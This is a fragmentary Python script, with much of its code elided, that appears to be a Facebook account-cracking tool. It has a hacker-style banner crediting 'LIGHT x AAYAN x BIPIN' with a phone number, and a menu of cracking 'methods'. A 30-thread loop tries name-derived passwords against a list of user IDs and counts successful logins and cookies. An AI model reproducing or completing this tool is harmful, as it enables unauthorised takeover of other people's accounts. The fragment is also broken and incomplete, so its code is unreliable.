...
try:
    ...
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING SUBSCRIPTION...')
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/profile.php?id=100094433701554')
...
\t[×] Developed By LIGHT x AAYAN x BIPIN
{WHITE}[•] AUTHOR       : LOREN
{WHITE}[•] STYLE         : PARRRRRRRRRAAAAA
{WHITE}[•] WhatsApp     :   9821438707
[•] FaceBook     :   
[•] Version      :   {RED}1
{WHITE}[•] YouTube      :  

{WHITE}================================================
   \33[37;41m\t LIGHT  x AAYAN  x BIPIN \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('[1] METHOD NEW (M1)')
                                print('[2] METHOD MIX (M2)')
                                print('[3] METHOD OLD (M3)')
                                linex()
                                mthd=input(' CHOOSE : ')
                                linex()
                                clear()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m USE FLIGHT MODE FOR MORE COOKIES...\033[1;37m")
                                        linex()
                                        for user in fo:
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [LOREN-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
